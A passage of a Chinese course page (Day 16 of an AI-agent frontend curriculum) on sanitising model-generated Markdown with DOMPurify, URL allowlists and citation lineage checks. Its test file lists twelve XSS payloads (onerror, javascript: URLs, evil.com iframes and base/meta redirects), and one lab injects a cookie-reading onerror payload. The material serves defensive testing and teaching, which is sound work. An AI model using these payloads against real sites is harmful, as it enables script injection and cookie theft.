+<h4 id="知识点-5纵深防御前端不信任服务端净化">知识点 5：纵深防御（前端不信任服务端净化）</h4>
+<ul>
+<li><strong>解决的问题</strong>：即使服务端声称已净化，误配置 / 误发布 / 被绕过时脏数据会到前端；单点防御一旦失守就全线崩溃</li>
+<li><strong>运行机制</strong>：前端独立跑一遍完整净化管线 + URL 白名单，不依赖服务端；审计面板（Day 15）用字段白名单拒绝未知字段；两层防御相互独立</li>
+<li><strong>项目落点</strong>：<code>sanitize-pipeline.ts</code> 前端强制净化；即使后端返回带 <code>&lt;script&gt;</code> 的报告，前端也剥离</li>
+<li><strong>生产误区</strong>："服务端已经用 bleach 净化了，前端直接 v-html"（服务端 bleach 版本漏洞 / 配置差异导致绕过）；前后端用不同白名单（服务端放行的标签前端拒绝，报告显示不全，反之泄漏）</li>
+<li><strong>验证方法</strong>：模拟服务端返回含 <code>&lt;script&gt;</code> 的报告，断言前端渲染后不含可执行脚本；对比前后端白名单一致性（同一份 <code>ALLOWED_TAGS</code> 常量）</li>
+</ul>
+<h4 id="知识点-6v-html-的安全边界与-data-citation-属性传递">知识点 6：<code>v-html</code> 的安全边界与 <code>data-citation</code> 属性传递</h4>
+<ul>
+<li><strong>解决的问题</strong>：Vue 的 <code>v-html</code> 直接把字符串当 HTML 插入，是 XSS 主入口；但引用标记 <code>&lt;sup data-citation="1"&gt;</code> 又必须通过 <code>v-html</code> 渲染</li>
+<li><strong>运行机制</strong>：<code>data-citation</code> 加入 DOMPurify 的 <code>ALLOWED_ATTR</code> 白名单，净化时保留；点击事件用事件委托（<code>@click</code> 在容器上读 <code>data-citation</code>），不在每个 <code>&lt;sup&gt;</code> 上绑监听</li>
+<li><strong>项目落点</strong>：<code>sanitize-pipeline.ts</code> 的 <code>ALLOWED_ATTR</code> 含 <code>data-citation</code>；<code>ReportView.vue</code> 的 <code>onReportClick</code> 事件委托</li>
+<li><strong>生产误区</strong>：<code>ALLOW_DATA_ATTR: true</code> 放行所有 <code>data-*</code>（可能夹带 <code>data-x="&lt;img onerror&gt;"</code> 的二次注入向量）；在 <code>v-html</code> 内容里绑 <code>@click</code>（Vue 不会给 <code>v-html</code> 插入的 DOM 绑定事件，必须委托）</li>
+<li><strong>验证方法</strong>：断言净化后 <code>data-citation</code> 属性保留、其他 <code>data-*</code> 被剥离；点击 <code>[n]</code> 触发滚动到对应 <code>#evidence-n</code></li>
+</ul>
+<h3 id="55-边写边问自己">5.5 边写边问自己</h3>
+<ul>
+<li><code>isSafeUrl</code> 为什么用 <code>new URL()</code> 而不是正则？（正则挡不住 HTML 实体编码 <code>jav&amp;#x61;script:</code>，<code>new URL</code> 会解析出真实协议）</li>
+<li>增量解析为什么按"双换行"切块而不按字符数？（双换行是 Markdown 块级边界，按字符切会切断语法）</li>
+<li>引用编号为什么由服务端分配而不是前端？（前端重新分配会与服务端记录的 lineage 不一致，导致 <code>[3]</code> 指向错误证据）</li>
+<li>lineage 校验为什么放 <code>finalize</code> 而不是每个 chunk？（流式过程中引用本来就不完整，中途校验必然误报悬空）</li>
+</ul>
+<hr>
+<h2 id="6-三版对比一览表">6. 三版对比一览表</h2>
+<div class="table-scroll" tabindex="0" role="region" aria-label="表格"><table><thead>
+<tr>
+<th>维度</th>
+<th>v1</th>
+<th>v2</th>
+<th>v3</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>功能</strong></td>
+<td>裸渲染 Markdown（<code>v-html</code> 直出）</td>
+<td>+ marked 解析 + DOMPurify 净化 + URL 协议白名单</td>
+<td>+ 证据链引用可点击 + 增量解析 + citation lineage 校验</td>
+</tr>
+<tr>
+<td><strong>事件类型 / 数据模型</strong></td>
+<td><code>string</code>（原始 Markdown 文本）</td>
+<td><code>SanitizedHtml</code>（净化后 HTML 串）</td>
+<td><code>ReportModel { blocks; citations; lineage }</code>（结构化报告 + 引用表）</td>
+</tr>
+<tr>
+<td><strong>净化策略</strong></td>
+<td>无（信任模型输出）</td>
+<td>marked → DOMPurify 白名单标签 + URL 协议校验</td>
+<td>同 v2，额外前端二次净化（纵深防御，不信任服务端）</td>
+</tr>
+<tr>
+<td><strong>引用/证据</strong></td>
+<td>无</td>
+<td>无（<code>[1]</code> 只是纯文本）</td>
+<td><code>[1]</code> 解析为 <code>data-citation</code> → 点击跳 <code>EvidenceCard</code>；每条绑 <code>source</code>+<code>version</code></td>
+</tr>
+<tr>
+<td><strong>可测试</strong></td>
+<td>无法测（渲染副作用）</td>
+<td>12 类 XSS 语料快照测试，执行数=0</td>
+<td>+ citation-lineage 单测（编号错乱拦截）+ incremental-parser 单测</td>
+</tr>
+<tr>
+<td><strong>架构层次</strong></td>
+<td>单 <code>.vue</code> 文件 <code>v-html</code></td>
+<td><code>sanitize/</code> 净化层</td>
+<td><code>citation/</code>（类型+lineage+resolver）+ <code>incremental/</code>（增量解析）+ <code>sanitize/</code> + 编排 <code>useReport</code></td>
+</tr>
+<tr>
+<td><strong>长内容性能</strong></td>
+<td>每次 chunk 全量 <code>marked()</code> O(N²)</td>
+<td>同 v1（还是全量解析）</td>
+<td>增量解析：只解析新增 block，单帧 &lt; 16ms</td>
+</tr>
+<tr>
+<td><strong>编译期抓遗漏</strong></td>
+<td>无（<code>string</code> 无约束）</td>
+<td>URL 协议 union type</td>
+<td>citation <code>source</code> 判别联合 + lineage 编号连续性运行期断言</td>
+</tr>
+<tr>
+<td><strong>对齐后续 Day</strong></td>
+<td>—</td>
+<td>—</td>
+<td>citation 数据模型对齐 Day 17-20 RAG 引用溯源、Day 30 M3 门禁「结论必须可追溯到证据」</td>
+</tr>
+</tbody>
+</table></div><hr>
+<h2 id="65-前端底子补弱独立深挖-html-入口">6.5 前端底子补弱（独立深挖 HTML 入口）</h2>
+<p>今天的深挖 HTML 文档：<code>output/Day16深挖-前端底子补弱.html</code>（补弱专用，独立于本文件）。</p>
+<p>深挖入口锚点（对应正文代码里的关键知识点）：</p>
+<ul>
+<li><strong>深挖 1：XSS 的三种注入面 —— 从今天项目里的 <code>v-html</code> 讲起</strong>
+从 <code>ReportView.vue</code> 的 <code>v-html="sanitizedHtml"</code> 出发，拆解 HTML 注入 / 属性注入 / URL 注入（<code>javascript:</code>）三条路径，为什么 <code>DOMPurify.sanitize()</code> 能拦前两条但 URL 协议要单独校验。</li>
+<li><strong>深挖 2：浏览器解析 HTML 的时机 —— 从 <code>innerHTML</code> 赋值讲起</strong>
+从 <code>v-html</code> 底层的 <code>el.innerHTML = html</code> 出发，讲解为什么 <code>&lt;img onerror&gt;</code> 会在赋值瞬间执行、为什么 <code>&lt;script&gt;</code> 反而不执行（HTML5 spec <code>innerHTML</code> 不执行 script），以及 DOMPurify 如何在赋值前拦截。</li>
+<li><strong>深挖 3：<code>marked</code> 的 tokenizer 与增量解析 —— 从 30KB 报告卡顿讲起</strong>
+从 <code>incremental-parser.ts</code> 出发，讲 marked 的 lexer 如何把 Markdown 切成 token 流，为什么"每来一个 chunk 就 <code>marked(fullText)</code>"是 O(N²)，增量解析如何只对新增行 tokenize。</li>
+</ul>
+<p><strong>8 子节结构</strong>（场景锚点 / 项目代码 / 设计点拆解 / 原理 / 反例 / 分层提问 / 项目对手戏 / 面试真题三档答法）在 HTML 内展开，本文件不重复。</p>
+<hr>
+<h2 id="7-项目验收清单阶段-e-f约-55-分钟">7. 项目验收清单（阶段 E-F，约 55 分钟）</h2>
+<h3 id="76-e写核心逻辑单元测试20-分钟">7.6 E：写核心逻辑单元测试（20 分钟）</h3>
+<p>今天要交付 3 个 spec 文件，共 18 个用例：</p>
+<p><strong>1. <code>sanitize/sanitize-html.spec.ts</code>（12 个用例 —— 12 类 XSS 语料）</strong></p>
+<p>覆盖 OWASP 常见注入面，每条断言"净化后不含可执行内容"：</p>
+<pre><code class="language-typescript">import { describe, it, expect } from 'vitest'
+import { sanitizeReportHtml } from './sanitize-html'
+
+// 12 类恶意语料（Threat Model 输出）
+const XSS_CORPUS: Array&lt;{ name: string; payload: string; mustNotContain: string }&gt; = [
+  { name: 'script 标签', payload: '&lt;script&gt;alert(1)&lt;/script&gt;', mustNotContain: '&lt;script' },
+  { name: 'img onerror', payload: '&lt;img src=x onerror=alert(1)&gt;', mustNotContain: 'onerror' },
+  { name: 'svg onload', payload: '&lt;svg onload=alert(1)&gt;', mustNotContain: 'onload' },
+  { name: 'javascript: URL', payload: '[x](javascript:alert(1))', mustNotContain: 'javascript:' },
+  { name: 'data: URL', payload: '[x](data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;)', mustNotContain: 'data:text/html' },
+  { name: 'iframe', payload: '&lt;iframe src=evil.com&gt;&lt;/iframe&gt;', mustNotContain: '&lt;iframe' },
+  { name: 'a onclick', payload: '&lt;a href="#" onclick="alert(1)"&gt;x&lt;/a&gt;', mustNotContain: 'onclick' },
+  { name: 'style expression', payload: '&lt;div style="background:url(javascript:alert(1))"&gt;x&lt;/div&gt;', mustNotContain: 'javascript:' },
+  { name: 'form action', payload: '&lt;form action="javascript:alert(1)"&gt;&lt;button&gt;x&lt;/button&gt;&lt;/form&gt;', mustNotContain: 'javascript:' },
+  { name: 'meta refresh', payload: '&lt;meta http-equiv="refresh" content="0;url=evil.com"&gt;', mustNotContain: '&lt;meta' },
+  { name: 'base href 劫持', payload: '&lt;base href="evil.com"&gt;', mustNotContain: '&lt;base' },
+  { name: 'object embed', payload: '&lt;object data="evil.swf"&gt;&lt;/object&gt;', mustNotContain: '&lt;object' },
+]
+
+describe('sanitizeReportHtml —— 12 类 XSS 语料执行数=0', () =&gt; {
+  for (const { name, payload, mustNotContain } of XSS_CORPUS) {
+    it(`拦截：${name}`, () =&gt; {
+      const output = sanitizeReportHtml(payload)
+      expect(output.toLowerCase()).not.toContain(mustNotContain.toLowerCase())
+    })
+  }
+})
+</code></pre>
+<p><strong>2. <code>citation/citation-lineage.spec.ts</code>（3 个用例 —— 引用编号校验）</strong></p>
+<pre><code class="language-typescript">import { describe, it, expect } from 'vitest'
+import { validateCitationLineage } from './citation-lineage'
+
+describe('validateCitationLineage', () =&gt; {
+  it('引用编号连续且都有对应证据 → ok', () =&gt; {
+    const result = validateCitationLineage(
+      ['结论 A[1]', '结论 B[2]'].join('\n'),
+      [{ index: 1, source: 'tool_call', refId: 't-01' }, { index: 2, source: 'metric', refId: 'm-05' }],
+    )
+    expect(result.ok).toBe(true)
+  })
+
+  it('引用 [3] 没有对应证据 → 拦截', () =&gt; {
+    const result = validateCitationLineage('结论[3]', [{ index: 1, source: 'tool_call', refId: 't-01' }])
+    expect(result.ok).toBe(false)
+    if (result.ok) throw new Error('expected error')
+    expect(result.error.code).toBe('citation_not_found')
+  })
+
+  it('证据表有 [2] 但正文从未引用 → 警告（孤儿证据）', () =&gt; {
+    const result = validateCitationLineage('结论[1]', [
+      { index: 1, source: 'tool_call', refId: 't-01' },
+      { index: 2, source: 'metric', refId: 'm-05' },
+    ])
+    expect(result.ok).toBe(true)
+    expect(result.warnings).toContainEqual(expect.objectContaining({ code: 'orphan_evidence' }))
+  })
+})
+</code></pre>
+<p><strong>3. <code>incremental/incremental-parser.spec.ts</code>（3 个用例 —— 增量解析）</strong></p>
+<pre><code class="language-typescript">import { describe, it, expect } from 'vitest'
+import { createIncrementalParser } from './incremental-parser'
+
+describe('incrementalParser', () =&gt; {
+  it('追加新 block 只解析新增部分', () =&gt; {
+    const parser = createIncrementalParser()
+    const first = parser.push('# 标题\n\n')
+    const second = parser.push('段落一\n\n')
+    expect(first.newBlocks.length).toBeGreaterThan(0)
+    expect(second.newBlocks.length).toBeGreaterThan(0)
+    // 第二次 push 不应重新产出标题 block
+    expect(second.newBlocks.every((b) =&gt; !b.html.includes('&lt;h1'))).toBe(true)
+  })
+
+  it('未完成的 block 缓冲不提前 flush', () =&gt; {
+    const parser = createIncrementalParser()
+    const r = parser.push('未完成的段落没有空行')
+    expect(r.newBlocks).toHaveLength(0) // 没有 block 边界，缓冲等待
+  })
+
+  it('finish() flush 剩余缓冲', () =&gt; {
+    const parser = createIncrementalParser()
+    parser.push('最后一段没有换行')
+    const r = parser.finish()
+    expect(r.newBlocks.length).toBeGreaterThan(0)
+  })
+})
+</code></pre>
+<p>运行：<code>pnpm --filter frontend test report</code> 应 18 个用例全绿。</p>
+<h3 id="77-f-1反证实验-15-分钟-手动去掉-dompurify-净化">7.7 F-1：反证实验 1（5 分钟）—— 手动去掉 DOMPurify 净化</h3>
+<p>把 <code>sanitize-html.ts</code> 里的 <code>DOMPurify.sanitize(html, ...)</code> 改成直接 <code>return html</code>，然后在报告里注入 <code>&lt;img src=x onerror=alert(document.cookie)&gt;</code>：</p>
+<ul>
+<li>观察现象：页面弹出 alert 显示 cookie，或控制台看到 CSP 报告 <code>Refused to execute inline event handler</code></li>
+<li>记录证据：DOM 快照里 <code>&lt;img&gt;</code> 带 <code>onerror</code> 属性保留；Network 面板出现向外部的可疑请求</li>
+<li>结论：<strong>没有 DOMPurify，模型输出的任意 HTML 直接在用户浏览器执行</strong>。这就是"证据与 XSS"这一天最核心的保护机制</li>
+</ul>
+<p>改回来后重跑测试，确认 12 类语料执行数恢复为 0。</p>
+<h3 id="78-f-2反证实验-25-分钟-手动去掉-citation-lineage-校验">7.8 F-2：反证实验 2（5 分钟）—— 手动去掉 citation lineage 校验</h3>
+<p>把 <code>useReport.ts</code> 里的 <code>validateCitationLineage(...)</code> 调用注释掉，然后构造一个"正文引用 <code>[3]</code> 但证据表只有 <code>[1][2]</code>"的报告：</p>
+<ul>
+<li>观察现象：点击 <code>[3]</code> 跳转到 <code>undefined</code> 证据卡片，页面显示空白 / 报错 <code>Cannot read property 'source' of undefined</code></li>
+<li>记录证据：控制台报错栈指向 <code>citation-resolver.ts</code>；UI 上 <code>[3]</code> 是死链</li>
+<li>结论：<strong>没有 lineage 校验，模型编造的引用编号会导致"看起来有据可查、实际指向虚空"</strong>，这比无引用更危险（给运维虚假的可信度）</li>
+</ul>
+<p>改回来后确认 lineage 校验在渲染前拦截，报告降级为"引用编号异常，已隐藏引用跳转"。</p>
+<h3 id="79-f-3验证-提交10-分钟">7.9 F-3：验证 + 提交（10 分钟）</h3>
+<p>四件套：</p>
+<pre><code class="language-bash">pnpm --filter frontend typecheck
+pnpm --filter frontend lint
+pnpm --filter frontend test report
+pnpm --filter frontend build
+</code></pre>
+<p>四条全绿后提交（Conventional Commits）：</p>
+<pre><code>feat(report): 诊断报告安全渲染 + 证据链引用（Day16 v3）
+
+- sanitize: marked + DOMPurify 双层净化，URL 协议白名单，12 类 XSS 语料执行数=0
+- citation: 引用编号 lineage 校验，[n] 可点击跳转 EvidenceCard，绑定 source+version
+- incremental: 流式报告增量解析，30KB 报告单帧解析 &lt; 16ms
+- test: sanitize 12 例 + lineage 3 例 + incremental 3 例，共 18 例全绿
+
+Refs: Day16
+</code></pre>
+<p><strong>⚠️ 硬红线：不要 <code>git push</code></strong>。今天的改动只在本地 commit，Day17 结束时集中 push。</p>
+<hr>
+<h2 id="8-通过标准">8. 通过标准</h2>
+<ul>
+<li>[ ] 12 类 XSS 恶意语料，实际执行的脚本数 = 0（<code>sanitize-html.spec.ts</code> 全绿）</li>
+<li>[ ] 每条事实结论后的 <code>[n]</code> 可点击跳转到对应真实证据（ToolCall / Metric / Alert）</li>
+<li>[ ] 每条引用绑定 <code>source</code> + <code>version</code>，运维可验证结论基于哪条真实数据</li>
+<li>[ ] 引用编号错乱（<code>[3]</code> 无对应证据）被 lineage 校验在渲染前拦截，不产生死链</li>
+<li>[ ] 30KB 长报告流式渲染时增量解析，单帧解析 &lt; 16ms（Performance 面板无长任务）</li>
+<li>[ ] 前端做二次净化（不信任服务端已净化），纵深防御</li>
+<li>[ ] 四件套（typecheck / lint / test / build）全绿</li>
+<li>[ ] commit 含 <code>Refs: Day16</code>，未执行 <code>git push</code></li>
+</ul>
+<hr>
+<h2 id="9-提交物">9. 提交物</h2>
+<ol>
+<li><strong>代码 commit</strong>：<code>sanitize/</code> + <code>citation/</code> + <code>incremental/</code> + <code>useReport.ts</code> + <code>ReportView.vue</code> + <code>EvidenceCard.vue</code></li>
+<li><strong>测试输出</strong>：<code>pnpm --filter frontend test report</code> 的 18 个用例通过截图 / 日志</li>
+<li><strong>学习日志</strong>：记录三版演进中"为什么 marked 之后还要 DOMPurify"的理解</li>
+<li><strong>架构证据</strong>：Threat Model 文档（12 类攻击面 + 对应防御层），保存到 <code>docs/security/day16-threat-model.md</code></li>
+<li><strong>AI Review 记录</strong>：AI 生成的攻击语料 / UI 样式的接受、修改、拒绝理由</li>
+</ol>
+<hr>
+<h2 id="10-课末-3-个核心问题">10. 课末 3 个核心问题</h2>
+<ol>
+<li>请从今天项目的真实入口（模型返回的 Markdown 文本）到最终输出（用户看到的安全报告），解释"证据与 XSS"的数据流；当天知识链"Markdown 安全、XSS、危险 URL、证据链、长内容性能"分别在哪一层起作用，为什么按这个顺序学习？</li>
+<li>如果故意移除今天最关键的保护机制（DOMPurify 净化 或 citation lineage 校验），线上会出现什么可观察现象？请给出最小复现、定位证据、恢复动作和一条防复发测试。</li>
+<li>请引用今天的具体代码（<code>sanitize-html.ts</code> / <code>citation-lineage.ts</code>）、测试（18 例）和架构证据（Threat Model），证明项目目标已达到；再说明当前实现距离企业生产标准还缺什么（如 CSP header、Trusted Types），下一步如何演进而不破坏已有合同。</li>
+</ol>
+<hr>
+<h2 id="11-真实项目情境题联网更新-2026-07-13">11. 真实项目情境题（联网更新 2026-07-13）</h2>
+<blockquote>
+<p>以下是依据当前中国岗位职责和官方技术机制构造的教学模拟，不代表来源企业真实发生过相同事故。题目中的规模和指标是练习约束，不是本项目已经取得的生产数据。</p>
+</blockquote>
+<ol>
+<li>模型输出包含 <code>&lt;img onerror&gt;</code>、<code>javascript:</code> URL 和伪造引用，预览页面执行脚本并把用户带到钓鱼页。请用 CSP 报告、DOM 快照和引用解析日志定位；先关闭富文本/外链止损，再做 Markdown 白名单、URL 协议校验和 DOM 净化，12 类攻击语料验证执行数为 0。回答必须按"定位证据 -&gt; 临时止损 -&gt; 根因修复 -&gt; 回归验证"组织。
+依据：<a href="https://genai.owasp.org/" target="_blank" rel="noopener noreferrer">S30 OWASP GenAI</a></li>
+<li>30KB 诊断报告每个 chunk 都全量解析 Markdown，CPU 达 95%，同时引用 [3] 指向错误 ToolCall。请用 Performance profile、解析次数和 citation lineage 定位；先降低渲染频率止损，再增量解析并绑定 source/version，验证长内容 P95 和每条结论可追溯。回答必须按"定位证据 -&gt; 临时止损 -&gt; 根因修复 -&gt; 回归验证"组织。
+依据：<a href="https://jobs.bytedance.com/experienced/position/7650035429911824693/detail" target="_blank" rel="noopener noreferrer">S1 Aime</a></li>
+</ol>
+<p>知识映射：Markdown/XSS、危险 URL、证据链与长内容性能。</p>
+<hr>
+<h2 id="12-pdf-面试题">12. PDF 面试题</h2>
+<blockquote>
+<p>以下题目引用自公开面经 PDF 汇编，文件名不等于官方题库；用作练习触发点，不代表本项目对齐了任何一家公司的真实校招/社招题库。</p>
+</blockquote>
+<ol>
+<li>大模型返回 Markdown、代码块和公式时，前端用什么方案渲染并保证安全？
+来源：<a href="/ai-teacher-agent-devolop/missing.html?ref=..%2F..%2F%25E8%25B5%2584%25E6%25BA%2590%2F2026%25E9%25AB%2598%25E5%25BE%25B7%2520Al%2520agent%2520%25E5%2589%258D%25E7%25AB%25AF%25E5%25BC%2580%25E5%258F%2591.pdf" class="missing-link">《2026高德 Al agent 前端开发》</a>，第 6 页。</li>
+<li>如何防止 XSS 和 CSRF 攻击？
+来源：<a href="/ai-teacher-agent-devolop/missing.html?ref=..%2F..%2F%25E8%25B5%2584%25E6%25BA%2590%2F2024%25E5%25AD%2597%25E8%258A%2582%25E5%2589%258D%25E7%25AB%25AF%25E9%259D%25A2%25E8%25AF%2595%25E9%25A2%2598%25EF%25BC%258845%25E9%25A2%2598%25EF%25BC%2589.pdf" class="missing-link">《2024字节前端面试题（45题）》</a>，第 12 页。</li>
+</ol>
+<p>题目说明：覆盖 Markdown 增量解析、DOMPurify/CSP、危险 HTML/URL 和长内容性能。第一题对应今天的净化管线 + 增量解析，第二题是安全基础追问。</p>
+<hr>
+<h2 id="13-完成后教师五连问">13. 完成后教师五连问</h2>
+<p>学生提交 commit、测试输出、学习日志、反证记录和架构证据后，教师依据真实 diff 按"局部机制 -&gt; 边界一致性 -&gt; 线上事故 -&gt; 工程权衡 -&gt; 架构演进"现场提出 5 道问题。五连问不预先固定，也不由上面的 PDF 题替代；评分规则见<a href="/ai-teacher-agent-devolop/materials/output/AI%E6%95%99%E5%B8%88%E4%BA%94%E8%BF%9E%E9%97%AE%E9%AA%8C%E6%94%B6%E5%8D%8F%E8%AE%AE.html">《AI 教师五连问验收协议》</a>。</p>
+<hr>
+<h2 id="14-本-day-在-90-天路线中的锚点">14. 本 Day 在 90 天路线中的锚点</h2>
+<ul>
+<li><strong>承接</strong>：Day 15（Agent 时间线：派生状态 + 审计 UI）产出的 raw event 派生视图，今天进一步渲染其中的诊断报告文本</li>
+<li><strong>本日</strong>：Day 16（证据与 XSS）—— 安全渲染 + 证据链引用，让每条模型结论可追溯到真实证据</li>
+<li><strong>指向</strong>：
+<ul>
+<li>Day 17-20（LangChain RAG）：今天的 citation 数据模型（<code>source</code> + <code>version</code>）直接复用为 RAG 引用溯源的展示层</li>
+<li>Day 30（M3 门禁）：会要求"任何一条诊断结论都必须能点击引用跳到真实证据"，今天的 lineage 校验是这条门禁的地基</li>
+<li>Day 61-90（p2-agent-workbench）：多 Agent 协同时，每个 Agent 的输出都要经过今天的净化管线才能进入共享工作区</li>
+</ul>
+</li>
+</ul>
+
+          <p class="old-version"><a href="/ai-teacher-agent-devolop/materials/output/90%E5%A4%A9%E9%80%90%E6%97%A5%E4%BB%BB%E5%8A%A1/Day16-old.html">查看 Day 16 历史版本</a></p>
+          <nav class="day-pagination" aria-label="前后课程">
+            <a href="/ai-teacher-agent-devolop/day/15.html">← Day 15 · Agent 时间线</a>
+            <a href="/ai-teacher-agent-devolop/day/17.html">Day 17 · Human-in-the-loop →</a>
+          </nav>
+        </article>
+        <nav class="outline" aria-label="本页目录">
+          <strong>本页目录</strong>
+          <ul><li><a href="#0-%E4%BB%8A%E5%A4%A9%E5%9C%A8-90-%E5%A4%A9%E8%B7%AF%E7%BA%BF%E4%B8%AD%E7%9A%84%E4%BD%8D%E7%BD%AE">0. 今天在 90 天路线中的位置</a></li><li><a href="#1-%E4%BB%8A%E5%A4%A9%E8%A6%81%E4%BA%A4%E4%BB%98%E7%9A%84%E5%8A%9F%E8%83%BD%E6%A8%A1%E5%9D%97">1. 今天要交付的功能模块</a></li><li><a href="#14-%E6%9C%AC%E6%97%A5%E9%A1%B9%E7%9B%AE%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84%E5%8A%A8%E6%89%8B%E5%89%8D%E5%85%88%E7%9C%8B%E9%AA%A8%E6%9E%B6">1.4 本日项目目录结构（动手前先看骨架）</a></li><li><a href="#15-%E9%98%B6%E6%AE%B5-d%E5%8A%A8%E6%89%8B%E8%84%9A%E6%89%8B%E6%9E%B620-%E5%88%86%E9%92%9F%E5%85%88%E6%90%AD%E9%AA%A8%E6%9E%B6%E5%86%8D%E7%9C%8B%E6%AD%A3%E6%96%87">1.5 阶段 D：动手脚手架（20 分钟，先搭骨架再看正文）</a></li><li><a href="#2-%E5%AD%A6%E4%B9%A0%E8%8A%82%E5%A5%8F90-%E9%98%85%E8%AF%BB-90-%E5%8A%A8%E6%89%8B">2. 学习节奏（90 阅读 / 90 动手）</a></li><li><a href="#3-v1%E6%9C%80%E5%B0%8F%E9%97%AD%E7%8E%AFmarked-v-html-%E8%A3%B8%E6%B8%B2%E6%9F%93">3. v1：最小闭环（marked + v-html 裸渲染）</a></li><li><a href="#4-v2%E5%8A%A0-dompurify-%E5%87%80%E5%8C%96-url-%E5%8D%8F%E8%AE%AE%E7%99%BD%E5%90%8D%E5%8D%95">4. v2：加 DOMPurify 净化 + URL 协议白名单</a></li><li><a href="#5-v3%E8%AF%81%E6%8D%AE%E9%93%BE%E5%BC%95%E7%94%A8-%E5%A2%9E%E9%87%8F%E8%A7%A3%E6%9E%90-%E5%87%80%E5%8C%96%E5%88%86%E5%B1%82%E7%BB%88%E6%80%81">5. v3：证据链引用 + 增量解析 + 净化分层（终态）</a></li><li><a href="#6-%E4%B8%89%E7%89%88%E5%AF%B9%E6%AF%94%E4%B8%80%E8%A7%88%E8%A1%A8">6. 三版对比一览表</a></li><li><a href="#65-%E5%89%8D%E7%AB%AF%E5%BA%95%E5%AD%90%E8%A1%A5%E5%BC%B1%E7%8B%AC%E7%AB%8B%E6%B7%B1%E6%8C%96-html-%E5%85%A5%E5%8F%A3">6.5 前端底子补弱（独立深挖 HTML 入口）</a></li><li><a href="#7-%E9%A1%B9%E7%9B%AE%E9%AA%8C%E6%94%B6%E6%B8%85%E5%8D%95%E9%98%B6%E6%AE%B5-e-f%E7%BA%A6-55-%E5%88%86%E9%92%9F">7. 项目验收清单（阶段 E-F，约 55 分钟）</a></li><li><a href="#8-%E9%80%9A%E8%BF%87%E6%A0%87%E5%87%86">8. 通过标准</a></li><li><a href="#9-%E6%8F%90%E4%BA%A4%E7%89%A9">9. 提交物</a></li><li><a href="#10-%E8%AF%BE%E6%9C%AB-3-%E4%B8%AA%E6%A0%B8%E5%BF%83%E9%97%AE%E9%A2%98">10. 课末 3 个核心问题</a></li><li><a href="#11-%E7%9C%9F%E5%AE%9E%E9%A1%B9%E7%9B%AE%E6%83%85%E5%A2%83%E9%A2%98%E8%81%94%E7%BD%91%E6%9B%B4%E6%96%B0-2026-07-13">11. 真实项目情境题（联网更新 2026-07-13）</a></li><li><a href="#12-pdf-%E9%9D%A2%E8%AF%95%E9%A2%98">12. PDF 面试题</a></li><li><a href="#13-%E5%AE%8C%E6%88%90%E5%90%8E%E6%95%99%E5%B8%88%E4%BA%94%E8%BF%9E%E9%97%AE">13. 完成后教师五连问</a></li><li><a href="#14-%E6%9C%AC-day-%E5%9C%A8-90-%E5%A4%A9%E8%B7%AF%E7%BA%BF%E4%B8%AD%E7%9A%84%E9%94%9A%E7%82%B9">14. 本 Day 在 90 天路线中的锚点</a></li></ul>
+        </nav>
+      </div>
+    </main>
+  </div>
+
+</body></html>
